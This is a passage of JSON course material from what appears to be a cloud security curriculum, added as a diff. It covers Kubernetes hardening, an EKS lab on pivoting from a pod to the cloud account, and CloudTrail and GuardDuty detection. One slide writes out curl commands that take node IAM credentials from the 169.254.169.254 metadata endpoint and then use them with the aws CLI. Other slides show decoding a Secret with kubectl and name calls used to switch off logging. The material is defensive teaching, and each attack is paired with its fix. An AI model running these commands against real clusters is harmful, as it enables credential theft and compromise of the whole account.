+            "body": "Consider the lateral-movement step an attacker takes after landing in a frontend pod: scan the pod network, find the database, connect with stolen creds.\n\nWithout NetworkPolicy, every pod is reachable, so the scan and the direct DB connection succeed. The blast radius is the whole cluster.\n\nWith a default-deny ingress policy on the database namespace plus one allow rule ('only pods labeled app=backend on port 5432'), the frontend pod's direct connection to the database is dropped by the CNI before it reaches the DB. The attacker must now compromise a backend pod first, which is a harder, noisier step, and egress policy can stop the beacon entirely.\n\nSo the mechanism is simple but powerful: segmentation converts 'one pod = whole cluster' into 'one pod = its declared neighbours only'. It is the Kubernetes version of network micro-segmentation and a core defense-in-depth control.",
+            "check": {
+              "question": "What is the Kubernetes networking default, and what does a default-deny NetworkPolicy change?",
+              "options": [
+                "Default is deny-all; the policy opens everything up",
+                "Default is that all pods can reach all other pods; a default-deny policy blocks all pod traffic except explicitly allowed flows, limiting lateral movement",
+                "Default is that pods have no network at all; the policy adds networking",
+                "NetworkPolicy only affects the control plane, not pods"
+              ],
+              "correctIndex": 1,
+              "explanation": "Kubernetes allows all pod-to-pod traffic by default. A default-deny NetworkPolicy (plus explicit allow rules) segments the network so a compromised pod can only reach its declared neighbours, shrinking blast radius. It requires a CNI like Calico or Cilium to be enforced."
+            }
+          },
+          {
+            "title": "Protecting cluster secrets",
+            "body": "Kubernetes Secret objects are, by default, only base64-encoded in etcd, which is encoding, not encryption. Anyone who reads etcd or a backup reads them. Harden on several fronts:\n\n1. Encryption at rest: configure EncryptionConfiguration so Secrets are encrypted in etcd. Prefer a KMS provider (AWS KMS, GCP KMS, Azure Key Vault) over the local aescbc key, so the key is not next to the data. On EKS this is the 'envelope encryption with KMS' option.\n2. External secret stores: keep real secrets in AWS Secrets Manager / SSM, HashiCorp Vault, GCP Secret Manager, and sync them in with the External Secrets Operator or the Secrets Store CSI driver, so secrets are short-lived and centrally rotated rather than sitting in etcd forever.\n3. Least exposure: do not mount secrets a pod does not need; prefer file mounts over env vars (env is easier to leak via crash dumps and child processes); restrict secrets get/list in RBAC (topic 5).\n4. Rotate and audit: short-lived credentials and audit logging on secret access.\n\nWorked snippet: enabling KMS envelope encryption via EncryptionConfiguration means a stolen etcd snapshot is ciphertext without the KMS key.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "kubectl get secret db-creds -o jsonpath='{.data.password}' | base64 -d",
+                  "output": "S3cr3tP@ss   # base64 is NOT encryption"
+                },
+                {
+                  "command": "# EncryptionConfiguration with a KMS provider -> etcd stores ciphertext",
+                  "output": "providers:\n  - kms:\n      name: aws-kms\n      endpoint: unix:///var/run/kmsplugin.sock\n  - identity: {}"
+                },
+                {
+                  "command": "ETCDCTL_API=3 etcdctl get /registry/secrets/default/db-creds | strings | grep -i pass",
+                  "output": "(no plaintext match - value is KMS-encrypted)"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Admission control: policy-as-code (Gatekeeper, Kyverno)",
+            "body": "PSA is coarse (three preset levels). For precise, organisation-specific rules you use an admission controller that runs your policies on every create/update request and can allow, deny, or mutate.\n\n- OPA Gatekeeper: policies written in Rego (the Open Policy Agent language); flexible, powerful, steeper learning curve.\n- Kyverno: Kubernetes-native YAML policies; easier to read; supports validate, mutate, generate and verifyImages (signature checks, topic 2).\n\nTypical policies to enforce the whole module:\n- deny privileged, hostPath, hostNetwork/PID, docker.sock mounts (topic 3);\n- require runAsNonRoot, drop ALL caps, read-only root fs, seccomp RuntimeDefault;\n- require images from the private registry and signed with cosign (topic 2);\n- forbid dangerous ClusterRoleBindings (topic 5);\n- require NetworkPolicy in every namespace.\n\nStart in audit mode to find violations, then switch to enforce. This is the enforcement backbone: it turns the best practices on the other slides into rules the cluster applies automatically, so a mistake or an attacker cannot simply create a non-compliant pod.",
+            "diagram": {
+              "type": "request-response",
+              "leftLabel": "kubectl apply (bad pod)",
+              "rightLabel": "API server + Kyverno",
+              "exchanges": [
+                {
+                  "direction": "right",
+                  "label": "create Pod",
+                  "payload": "securityContext: { privileged: true }, volume: hostPath: /"
+                },
+                {
+                  "direction": "left",
+                  "label": "admission webhook denies",
+                  "payload": "error: validation failed: privileged containers are not allowed; hostPath '/' is not allowed"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Per-pod hardening and the lab",
+            "body": "Finishing controls set on each pod's securityContext (and enforced by PSA/admission):\n- seccomp: filter which syscalls the container may make. seccompProfile: { type: RuntimeDefault } blocks dangerous syscalls used in breakouts; custom profiles lock down further.\n- AppArmor (or SELinux): mandatory access control confining what files/capabilities the process can touch.\n- runAsNonRoot: true and a non-zero runAsUser: do not run as root in the container.\n- allowPrivilegeEscalation: false and capabilities: drop: [ALL].\n- readOnlyRootFilesystem: true: the attacker cannot write tools or modify binaries; use an emptyDir for any needed scratch space.\n\nLab (Pod Security, Network Policy & Secrets): take a cluster running a deliberately loose pod, apply restricted Pod Security Admission to the namespace and watch the privileged pod get rejected; add a default-deny NetworkPolicy plus minimal allow rules and prove a foothold pod can no longer reach the database; enable Secret encryption (KMS or aescbc) and confirm etcd no longer holds plaintext; add a Kyverno policy requiring runAsNonRoot and signed images. Verify each control by re-running the attack it blocks.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Loose pod (attacker-friendly)",
+                  "points": [
+                    "runs as root",
+                    "all caps, privilege escalation on",
+                    "writable root fs (drop tools)",
+                    "no seccomp/AppArmor"
+                  ]
+                },
+                {
+                  "label": "Hardened pod",
+                  "points": [
+                    "runAsNonRoot + non-zero UID",
+                    "drop ALL caps, no-privesc",
+                    "readOnlyRootFilesystem",
+                    "seccomp RuntimeDefault + AppArmor"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why it matters",
+            "body": "These guardrails are defense in depth: they assume RBAC or the app will eventually fail and make sure a single compromise does not become total compromise.\n- Pod Security / admission stops a compromised identity from creating a privileged or host-mounting pod, killing the easy breakout and the pods/create escalation.\n- NetworkPolicy segments traffic so a popped pod reaches only its declared neighbours, not the whole cluster, and egress policy blocks beaconing and metadata access (topic 7).\n- Secret encryption and external stores mean a stolen etcd snapshot is ciphertext, not credentials.\n- Policy-as-code (Kyverno/Gatekeeper) makes all of this automatic and auditable.\n\nMap to standards: CIS Kubernetes Benchmark, NSA/CISA Kubernetes Hardening Guide, and the Pod Security Standards. In an assessment, the findings are namespaces with no NetworkPolicy, no Pod Security enforcement, unencrypted secrets, and no admission policy. Carry this: RBAC decides who gets in; these controls decide how far they can get once inside. You need both."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m9-7",
+        "moduleId": "cloud-m9",
+        "number": 58,
+        "title": "Cloud-Linked Cluster Compromise (EKS/AKS/GKE)",
+        "type": "lab",
+        "week": 3,
+        "description": "The bridge back to the cloud account. On managed Kubernetes, a pod can often reach the node's cloud role and pivot to the whole account.",
+        "keyPoints": [
+          "Pod reaching node IMDS to steal the node instance-role credentials",
+          "IRSA (EKS) / Workload Identity (GKE) / AKS workload identity scoping",
+          "Why hop-limit and blocking pod access to metadata is critical on EKS",
+          "GKE metadata concealment and Workload Identity as the fix",
+          "Mapping cluster-admin to cloud-admin and cutting the pivot"
+        ],
+        "slides": [
+          {
+            "title": "What cloud-linked cluster compromise is",
+            "body": "On managed Kubernetes (EKS on AWS, GKE on Google, AKS on Azure) the worker nodes are cloud VMs, and each VM has a cloud identity (an IAM role / service account) so it can pull images, attach volumes, write logs. That identity is powerful. If a pod can reach it, a cluster compromise becomes a cloud-ACCOUNT compromise.\n\nAnalogy: the cluster is an office building; the cloud account is the whole company. Each node is a company car with the corporate fuel card in the glovebox (the node's cloud role). A pod reaching that card can fuel up on the company's dime far beyond the office.\n\nThe bridge is almost always the Instance Metadata Service (IMDS): a link-local HTTP endpoint at 169.254.169.254 that hands out the VM's cloud credentials to anything that can reach it from the node. By default, pods can often reach it too. This topic shows the pod-to-node-role pivot, the per-cloud identity mechanisms that fix it (IRSA, Workload Identity, AKS workload identity), and why blocking pod access to IMDS is critical. It is the capstone: how a container finding becomes an AWS/GCP/Azure incident."
+          },
+          {
+            "title": "How the pivot works: pod reaches node IMDS",
+            "body": "Step by step on EKS:\n1. Attacker gets code execution in a pod (app vuln, injection, prior topics).\n2. From the pod they curl the metadata endpoint 169.254.169.254. By default it is reachable because the pod shares the node's network path to that link-local address.\n3. IMDS returns the NODE's IAM role credentials (the EC2 instance role attached to the worker node).\n4. The node role is usually broader than any single pod needs: it can often read from S3, pull from ECR, describe EC2, sometimes assume other roles. The attacker now has those AWS permissions, cluster-wide, as the node.\n5. With node credentials they pivot across the AWS account: read S3 buckets, enumerate resources, escalate if the role is over-permissioned.\n\nIMDSv1 is the worst case: a simple unauthenticated GET returns the credentials. IMDSv2 requires a PUT to get a short-lived session token first, which (with a low hop limit) blocks the naive pod request. The core problem: node identity is shared by all pods on the node unless you isolate it.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Foothold in pod",
+                  "detail": "RCE in app container"
+                },
+                {
+                  "label": "curl 169.254.169.254",
+                  "detail": "pod can reach node's IMDS"
+                },
+                {
+                  "label": "Get node IAM role creds",
+                  "detail": "AccessKey/Secret/Token for the EC2 node role"
+                },
+                {
+                  "label": "Pivot across AWS account",
+                  "detail": "S3, ECR, EC2, assume-role: account compromise"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Worked example: steal node credentials from a pod",
+            "body": "The actual requests on an EKS node with IMDSv1 reachable. The pod hits IMDS, reads the node role name, then the temporary credentials, and uses them against AWS. IMDSv2 would require obtaining a token via PUT first; a hop limit of 1 stops the pod from completing that.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                  "output": "eksctl-prod-nodegroup-NodeInstanceRole-ABC123"
+                },
+                {
+                  "command": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/eksctl-prod-nodegroup-NodeInstanceRole-ABC123",
+                  "output": "{ \"AccessKeyId\": \"ASIA...\", \"SecretAccessKey\": \"...\", \"Token\": \"...\", \"Expiration\": \"...\" }"
+                },
+                {
+                  "command": "AWS_ACCESS_KEY_ID=ASIA... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... aws sts get-caller-identity",
+                  "output": "{ \"Arn\": \"arn:aws:sts::1234:assumed-role/...NodeInstanceRole.../i-0abc\" }  <-- now acting as the node role"
+                },
+                {
+                  "command": "aws s3 ls   # node role often over-permissioned",
+                  "output": "2026-01-10 prod-customer-backups\n2026-02-02 prod-model-artifacts   <-- account-wide access"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Mechanism: IMDSv2 and the hop limit",
+            "body": "IMDS (AWS) has two versions:\n- IMDSv1: request/response. A plain GET to 169.254.169.254 returns credentials. Any SSRF or pod with network access can read them.\n- IMDSv2: session-oriented. You must first PUT to /latest/api/token (with a special header) to get a token, then send it on each GET. This defeats simple SSRF (which usually can only GET).\n\nThe key knob is the metadata response hop limit (the IP TTL for IMDS responses). A pod's traffic to IMDS typically takes an extra network hop (through the node's bridge/overlay). If you set the hop limit to 1, the token/credential response cannot travel the extra hop to the pod, so pods cannot use IMDSv2 at all, while processes directly on the node still can.\n\nSo the recommended EKS baseline is: enforce IMDSv2 (HttpTokens=required) AND set HttpPutResponseHopLimit=1. Together they block the pod-to-node-role pivot for the overwhelming majority of cases, pushing workloads to use proper per-pod identity (IRSA) instead.",
+            "check": {
+              "question": "On EKS, why does enforcing IMDSv2 with a metadata hop limit of 1 block the pod-to-node-role credential theft?",
+              "options": [
+                "It encrypts the node's root volume",
+                "IMDSv2 requires a token obtained via PUT, and a hop limit of 1 prevents the IMDS response from reaching pods (which are one network hop away), so pods cannot retrieve node credentials",
+                "It deletes the node IAM role entirely",
+                "It makes the pod run as non-root"
+              ],
+              "correctIndex": 1,
+              "explanation": "IMDSv2 defeats simple GET-based SSRF by requiring a session token via PUT, and a hop limit of 1 stops the metadata response from traversing the extra hop to a pod. Node-local processes still work, but pods are cut off, forcing proper per-pod identity (IRSA)."
+            }
+          },
+          {
+            "title": "The fix: per-pod cloud identity (IRSA / Workload Identity)",
+            "body": "Blocking IMDS is necessary but pods still legitimately need cloud access (read a specific S3 bucket, etc.). The right answer is per-pod identity scoped to least privilege, not the shared node role.\n\n- AWS EKS IRSA (IAM Roles for Service Accounts): a Kubernetes ServiceAccount is federated to an IAM role via an OIDC provider. The pod gets a projected, short-lived web-identity token, exchanges it for temporary credentials of exactly its own IAM role. Each workload gets only the permissions it needs; the node role shrinks to the bare minimum. (EKS Pod Identity is a newer, simpler alternative with the same goal.)\n- GKE Workload Identity: a Kubernetes SA is bound to a Google service account; pods get that GSA's scoped credentials, and node access to the legacy metadata is concealed.\n- AKS Workload Identity: Kubernetes SA federated to an Azure AD (Entra) identity via OIDC, replacing the older pod-identity approach.\n\nThe common pattern: OIDC-federate the pod's SA to a least-privilege cloud role, hand the pod short-lived scoped credentials, and stop pods from ever touching the node metadata.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Node role via IMDS (bad)",
+                  "points": [
+                    "All pods share the node's IAM role",
+                    "Role is broad (ECR, S3, EC2)",
+                    "Any pod RCE -> account creds",
+                    "No per-workload scoping"
+                  ]
+                },
+                {
+                  "label": "IRSA / Workload Identity (good)",
+                  "points": [
+                    "Each SA -> its own cloud role",
+                    "Least-privilege per workload",
+                    "Short-lived OIDC-exchanged creds",
+                    "Pods blocked from node IMDS"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "GKE and AKS specifics; defense in depth",
+            "body": "Per-cloud notes:\n- GKE: enable Workload Identity, which also turns on metadata concealment (GKE Metadata Server) so pods cannot reach the raw node metadata to steal the node's GCE service-account token. Without it, the legacy GCE metadata endpoint leaks node credentials just like EKS IMDSv1.\n- AKS: use AKS Workload Identity (OIDC federation to Entra ID). Also restrict access to the Azure IMDS (169.254.169.254) from pods via network policy, and avoid the deprecated aad-pod-identity.\n\nLayered controls that cut the pivot even if one fails:\n- Enforce IMDSv2 + hop limit 1 (EKS); metadata concealment (GKE); block IMDS egress from pods.\n- NetworkPolicy egress rule denying pod traffic to 169.254.169.254 (topic 6).\n- Least-privilege node role: the node instance role should grant only what the kubelet truly needs, so even if stolen, it is nearly useless.\n- IRSA/Workload Identity for every pod that needs cloud access, each scoped tight.\n- Detect: GuardDuty (EKS) / Cloud audit logs flag anomalous use of node credentials and metadata access.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "pod",
+                  "label": "compromised pod",
+                  "highlighted": true
+                },
+                {
+                  "id": "np",
+                  "label": "NetworkPolicy egress deny 169.254.169.254"
+                },
+                {
+                  "id": "imds",
+                  "label": "IMDSv2 + hop-limit 1 / metadata concealment"
+                },
+                {
+                  "id": "node",
+                  "label": "node role (least privilege)"
+                },
+                {
+                  "id": "irsa",
+                  "label": "IRSA/WI scoped role",
+                  "highlighted": true
+                }
+              ],
+              "edges": [
+                {
+                  "from": "pod",
+                  "to": "np",
+                  "label": "blocked at network layer"
+                },
+                {
+                  "from": "pod",
+                  "to": "imds",
+                  "label": "blocked at metadata layer"
+                },
+                {
+                  "from": "pod",
+                  "to": "node",
+                  "label": "even if reached, little power"
+                },
+                {
+                  "from": "pod",
+                  "to": "irsa",
+                  "label": "uses own scoped identity instead"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Do it: the EKS Pod to Account lab, and why it matters",
+            "body": "Lab (EKS Pod to Account, AWS free tier): deploy a small EKS cluster with a pod you can exec into. From the pod, curl 169.254.169.254 to steal the node instance-role credentials and use them with the AWS CLI to prove account access (for example list an S3 bucket) - demonstrating the pivot. Then enforce the fix: set the node group to IMDSv2 required with HttpPutResponseHopLimit=1 (and/or add a NetworkPolicy denying egress to the metadata IP), configure IRSA so the pod uses its own least-privilege role, and tighten the node role. Re-run the theft and confirm the pod can no longer read node credentials while its IRSA-scoped access still works. Safety and cost: tear the cluster down after (denial-of-wallet applies to you too); only test accounts you own (default profile technieum).\n\nWhy it matters: this is the step that turns 'a container was compromised' into 'the AWS account was compromised'. Managed Kubernetes quietly links cluster and cloud through the node identity and IMDS, and the default posture often leaves that link open. The entire module converges here: image/supply-chain -> pod foothold -> breakout or RBAC escalation -> node credentials via IMDS -> cloud account. Cut the last link with IMDSv2+hop-limit/metadata concealment, pod IMDS egress deny, least-privilege node roles, and per-pod IRSA/Workload Identity. Map to: AWS EKS Best Practices, CIS EKS Benchmark, MITRE ATT&CK (Credential Access from Cloud Instance Metadata, T1552.005)."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "cloud-m10",
+    "name": "Cloud Logging, Monitoring & Detection",
+    "shortName": "Logging & Detection",
+    "month": 4,
+    "weeks": [
+      4
+    ],
+    "description": "You cannot defend what you cannot see. This module builds the detection and response capability: CloudTrail as the source of truth, GuardDuty and detective services, log pipelines, and writing detections for the attacks learned earlier — turning the course's offence into blue-team signal.",
+    "estimatedHours": 11,
+    "outcomes": [
+      "Architect a tamper-resistant logging pipeline centred on CloudTrail (management + data events)",
+      "Interpret GuardDuty, CloudTrail and VPC Flow Logs to detect real attack techniques",
+      "Write detections for the specific TTPs covered earlier (SSRF-exfil, privilege escalation, exfiltration)",
+      "Build an incident-response workflow for a cloud compromise"
+    ],
+    "topics": [
+      {
+        "id": "cloud-m10-1",
+        "moduleId": "cloud-m10",
+        "number": 59,
+        "title": "CloudTrail: The Source of Truth",
+        "type": "theory",
+        "week": 4,
+        "description": "Every API call is a CloudTrail event. Students learn its structure, the management/data/insight event split, and how attackers try to blind it.",
+        "keyPoints": [
+          "Management events (control plane) vs data events (S3 object, Lambda invoke) vs Insights",
+          "Organization trails and centralised logging to a locked S3 bucket",
+          "Tamper resistance: log file validation, SCP preventing StopLogging/DeleteTrail",
+          "Reading an event: principalId, sourceIPAddress, userAgent, errorCode",
+          "Attacker anti-forensics: disabling trails, and detecting that disablement"
+        ],
+        "slides": [
+          {
+            "title": "What CloudTrail Is",
+            "body": "Every action in an AWS account happens by calling an API — \"create this server\", \"read this file\", \"make a new access key\". CloudTrail is the service that writes down a record of every one of those API calls.\n\nThink of it as the flight recorder (the black box) of your AWS account. Planes don't record the black box because flights usually crash; they record it because when something goes wrong, the recording is the only reliable account of what happened. CloudTrail is the same: it is the source of truth for who did what, from where, and when.\n\nJargon: an API call is just a request your tools (the web console, the CLI, an SDK, or an attacker's script) send to AWS to make something happen. CloudTrail does not stop anything — it only records."
+          },
+          {
+            "title": "Three Kinds of Events",
+            "body": "CloudTrail records three categories, and the difference matters enormously for both cost and visibility.\n\n- Management events: control-plane actions — creating, changing, or deleting resources (RunInstances, CreateUser, AttachUserPolicy). On by default, free for one copy.\n- Data events: data-plane actions — reading or writing the data inside a resource (S3 GetObject/PutObject, Lambda Invoke). OFF by default, charged per event, and high-volume.\n- Insights events: CloudTrail's own anomaly detection on top of management events — it flags unusual bursts (e.g. a sudden spike in IAM calls).\n\nThe trap: an attacker can read thousands of secret S3 objects and, if data events are off, management-only CloudTrail shows nothing. You must deliberately enable data events on sensitive buckets.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Management events",
+                  "points": [
+                    "Control plane",
+                    "CreateUser, RunInstances",
+                    "On by default",
+                    "Free (1 trail copy)"
+                  ]
+                },
+                {
+                  "label": "Data events",
+                  "points": [
+                    "Data plane",
+                    "S3 GetObject, Lambda Invoke",
+                    "OFF by default",
+                    "Paid, high volume"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "Insights events",
+                  "points": [
+                    "ML on mgmt events",
+                    "Flags unusual bursts",
+                    "Opt-in",
+                    "Paid per analysed event"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "How an Event Is Produced",
+            "body": "CloudTrail sits behind the AWS API endpoints. When any principal (a user, a role, or a service) calls an API, the call passes through the same pipeline whether it succeeds or fails.\n\nThat last point is critical for detection: CloudTrail records failed, denied calls too. A principal generating hundreds of AccessDenied errors is one of the loudest signals of an attacker enumerating what they can reach.\n\nEvents are delivered to a trail — a configuration that says \"capture these events and deliver them to this S3 bucket (and optionally CloudWatch Logs)\". Delivery to S3 is near-real-time but not instant (typically within about 5 minutes).",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Principal calls API",
+                  "detail": "user / role / service, success OR denied"
+                },
+                {
+                  "label": "AWS API endpoint",
+                  "detail": "e.g. iam.amazonaws.com"
+                },
+                {
+                  "label": "CloudTrail captures",
+                  "detail": "who, what, from where, result"
+                },
+                {
+                  "label": "Trail delivers",
+                  "detail": "to S3 bucket + CloudWatch Logs"
+                },
+                {
+                  "label": "Queryable record",
+                  "detail": "Athena / SIEM / Insights"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Reading an Event",
+            "body": "Every CloudTrail event is a JSON record. Five fields do most of the investigative work:\n\n- eventName — the API that was called (e.g. CreateAccessKey)\n- userIdentity.principalId / arn — WHO did it\n- sourceIPAddress — WHERE from (an attacker's IP, or a Tor exit, or an EC2 range)\n- userAgent — the tool used (aws-cli, Boto3, a browser)\n- errorCode — present only if the call failed (AccessDenied, UnauthorizedOperation)\n\nLearn to read these the way a detective reads a logbook. The combination \"sensitive eventName + unfamiliar sourceIPAddress + scripting userAgent\" is often the whole story.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=CreateAccessKey",
+                  "output": "{\n  \"eventName\": \"CreateAccessKey\",\n  \"userIdentity\": { \"type\": \"IAMUser\", \"arn\": \"arn:aws:iam::111122223333:user/backup-svc\" },\n  \"sourceIPAddress\": \"203.0.113.47\",\n  \"userAgent\": \"aws-cli/2.15.0 Python/3.11\",\n  \"responseElements\": { \"accessKey\": { \"userName\": \"admin\" } }\n}"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Organization Trails & a Locked Bucket",
+            "body": "A single-account trail is easy for an attacker who gains that account to tamper with. The mature pattern centralises logging:\n\n1. Create an organization trail in the management (or a dedicated log-archive) account. It automatically captures events from every member account — new accounts included.\n2. Deliver all logs to one S3 bucket in a separate, locked-down log-archive account.\n3. Restrict that bucket so member-account admins cannot read, alter, or delete the logs — only a tiny set of security principals can.\n\nNow an attacker who fully compromises a workload account still cannot reach the evidence of what they did.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "org",
+                  "label": "Organization trail (mgmt account)"
+                },
+                {
+                  "id": "a1",
+                  "label": "Prod account events"
+                },
+                {
+                  "id": "a2",
+                  "label": "Dev account events"
+                },
+                {
+                  "id": "a3",
+                  "label": "New account (auto-included)"
+                },
+                {
+                  "id": "bucket",
+                  "label": "Locked S3 in log-archive account",
+                  "highlighted": true
+                }
+              ],
+              "edges": [
+                {
+                  "from": "a1",
+                  "to": "org"
+                },
+                {
+                  "from": "a2",
+                  "to": "org"
+                },
+                {
+                  "from": "a3",
+                  "to": "org"
+                },
+                {
+                  "from": "org",
+                  "to": "bucket",
+                  "label": "deliver, write-only for members"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Tamper Resistance",
+            "body": "Two mechanisms make logs trustworthy as evidence.\n\n1. Log file validation: when enabled, CloudTrail writes a digest file each hour containing SHA-256 hashes of the log files, signed with a private key AWS controls. Later you can run `aws cloudtrail validate-logs` and prove no file was altered or deleted after delivery.\n\n2. Service Control Policies (SCPs): an organization-level guardrail that can deny cloudtrail:StopLogging, cloudtrail:DeleteTrail, and cloudtrail:UpdateTrail for everyone except a break-glass role — even account root cannot turn logging off.\n\nTogether: the log can't be silently edited (validation) and can't be silently switched off (SCP).",
+            "check": {
+              "question": "An attacker compromises a prod account that is a member of an AWS Organization with an org trail and an SCP denying cloudtrail:StopLogging. What happens when they run `aws cloudtrail stop-logging`?",
+              "options": [
+                "It succeeds because they are an admin in that account",
+                "It is denied by the SCP, and the denied StopLogging call is itself recorded in CloudTrail",
+                "It succeeds but only pauses logging for 15 minutes",
+                "It deletes the org trail for all accounts"
+              ],
+              "correctIndex": 1,
+              "explanation": "An SCP is a hard ceiling on permissions that even account-level admins and root cannot exceed. The StopLogging call fails with AccessDenied — and because CloudTrail records denied calls too, the attempt leaves a loud signal in the logs."
+            }
+          },
+          {
+            "title": "Attacker Anti-Forensics",
+            "body": "Blinding the logs is a classic early move in a cloud intrusion (MITRE ATLAS / ATT&CK: Impair Defenses). The common techniques:\n\n- StopLogging — pauses the trail without deleting it\n- DeleteTrail — removes the trail entirely\n- PutEventSelectors — quietly narrows what is captured (e.g. drops data events)\n- Deleting or disabling the delivery S3 bucket\n\nThe defence is detection: an EventBridge rule or a GuardDuty finding (Stealth:IAMUser/CloudTrailLoggingDisabled) should fire the instant any of these calls appear. The event that disables logging is captured before logging stops, so you still get one alarm — if you are watching for it."
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Detection and incident response are built on one assumption: that there is a reliable, complete, tamper-resistant record of what happened. CloudTrail is that record.\n\nIf CloudTrail is misconfigured — management-only when secrets live in S3, single-account instead of centralised, no validation, no SCP — then every downstream tool (GuardDuty, Athena, your SIEM) inherits the blind spot. Most real-world \"we couldn't tell what the attacker took\" post-mortems trace back to a CloudTrail gap, not a clever adversary.\n\nGet the source of truth right first; everything else in this module reads from it."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m10-2",
+        "moduleId": "cloud-m10",
+        "number": 60,
+        "title": "GuardDuty & Detective Services",
+        "type": "theory",
+        "week": 4,
+        "description": "AWS's managed threat detection. Students learn what GuardDuty can and cannot see and how to triage its findings.",
+        "keyPoints": [
+          "GuardDuty finding types: credential exfil, crypto-mining, recon, anomalous API",
+          "InstanceCredentialExfiltration.OutsideAWS as the SSRF-chain signal",
+          "Data sources: CloudTrail, VPC Flow Logs, DNS logs, S3/EKS/Malware protection",
+          "Amazon Detective for investigation and entity behaviour graphs",
+          "Macie for sensitive-data discovery; Security Hub for aggregation"
+        ],
+        "slides": [
+          {
+            "title": "What GuardDuty Is",
+            "body": "GuardDuty is AWS's managed threat-detection service. You switch it on, and it continuously watches several log sources for signs of malicious or anomalous behaviour, then produces findings — structured alerts with a type, a severity, and the evidence.\n\nAnalogy: CloudTrail is the raw CCTV footage of your account. GuardDuty is the trained security guard who watches the feeds for you and taps you on the shoulder when something looks wrong — \"these credentials are being used from an IP that has never touched this account before.\"\n\nYou don't write rules or manage infrastructure. AWS maintains the detection logic, threat-intelligence feeds, and machine-learning baselines. It is detection-only: it alerts, it does not block."
+          },
+          {
+            "title": "What GuardDuty Looks At",
+            "body": "GuardDuty earns its value by correlating multiple data sources — it sees things no single log reveals.\n\n- CloudTrail management events — anomalous API usage, recon, policy changes\n- CloudTrail S3 data events — suspicious object access (optional add-on)\n- VPC Flow Logs — connections to known-bad IPs, crypto-mining traffic\n- DNS logs (the AWS-provided resolver) — queries to malware/C2 domains\n- Optional protections: EKS audit logs, RDS login activity, Lambda network activity, and Malware Protection (scanning EBS volumes)\n\nCrucially, GuardDuty consumes these feeds independently — you do not have to enable VPC Flow Logs or DNS logging separately for GuardDuty to use them.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "gd",
+                  "label": "GuardDuty engine",
+                  "highlighted": true
+                },
+                {
+                  "id": "ct",
+                  "label": "CloudTrail mgmt + S3 data"
+                },
+                {
+                  "id": "flow",
+                  "label": "VPC Flow Logs"
+                },
+                {
+                  "id": "dns",
+                  "label": "DNS query logs"
+                },
+                {
+                  "id": "ext",
+                  "label": "EKS / RDS / Lambda / Malware"
+                },
+                {
+                  "id": "find",
+                  "label": "Findings (type + severity)"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "ct",
+                  "to": "gd"
+                },
+                {
+                  "from": "flow",
+                  "to": "gd"
+                },
+                {
+                  "from": "dns",
+                  "to": "gd"
+                },
+                {
+                  "from": "ext",
+                  "to": "gd"
+                },
+                {
+                  "from": "gd",
+                  "to": "find",
+                  "label": "correlate + baseline"
+                }
+              ]
+            }
+          },
+          {
+            "title": "How a Finding Is Produced",
+            "body": "GuardDuty blends three detection styles:\n\n1. Threat intelligence — matching IPs and domains against AWS and partner feeds of known-bad infrastructure.\n2. Anomaly detection — machine-learning baselines of what is normal for each principal and resource, flagging deviations (a user who suddenly calls APIs they never have, from a new country).\n3. Signatures — known attack patterns (e.g. the exact shape of credential exfiltration).\n\nEach finding carries a severity (Low / Medium / High, scored 1-8.9) and a type string that names the technique precisely. The type string is what you route and triage on.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Ingest feeds",
+                  "detail": "CloudTrail, Flow, DNS"
+                },
+                {
+                  "label": "Compare",
+                  "detail": "threat intel + ML baseline + signatures"
+                },
+                {
+                  "label": "Match found",
+                  "detail": "anomaly or known-bad"
+                },
+                {
+                  "label": "Emit finding",
+                  "detail": "type + severity + evidence"
+                },
+                {
+                  "label": "Route",
+                  "detail": "EventBridge -> Security Hub / alert"
+                }
+              ]
+            }
+          },
+          {
+            "title": "The SSRF-Chain Signal",
+            "body": "One finding type is the payoff of everything you learned about SSRF and the instance metadata service (IMDS): InstanceCredentialExfiltration.OutsideAWS.\n\nThe attack chain from earlier modules: SSRF -> read IMDS -> steal the EC2 role's temporary credentials -> use them from the attacker's own machine. GuardDuty spots the last step. It knows which temporary credentials belong to which EC2 instance, and it knows that instance's role credentials should only ever be used from inside AWS. The moment those same credentials appear in a CloudTrail event with a sourceIPAddress outside AWS, it fires a High-severity finding.\n\nThis is detection catching offence directly — the blue-team mirror of the red-team technique.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
